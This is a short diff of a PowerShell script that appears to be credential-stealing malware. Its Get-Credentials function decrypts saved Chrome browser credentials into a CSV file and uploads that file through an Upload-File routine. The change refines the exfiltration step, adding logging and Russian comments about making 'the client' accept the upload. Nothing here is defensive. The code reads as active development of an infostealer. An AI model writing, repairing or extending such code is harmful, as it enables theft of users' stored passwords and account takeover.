@@ -516,9 +516,11 @@ function Get-Credentials {
     try {
         $chromeCreds = Get-DecryptedChromeCreds
 
-        if (Test-Path $chromeCreds) {
+        if ((Test-Path $chromeCreds) -and ($chromeCreds -like "*.csv")) {
             Output-Log "[+] Chrome creds saved to file: $chromeCreds"
-            return Upload-File $chromeCreds
+            $upload = Upload-File $chromeCreds
+            Output-Log $upload  # <- Важно!
+            return $upload      # <- Чтобы клиент принял
         } else {
             Output-Log "[ERROR] Chrome creds extraction returned non-path result:"
             Output-Log "$chromeCreds"
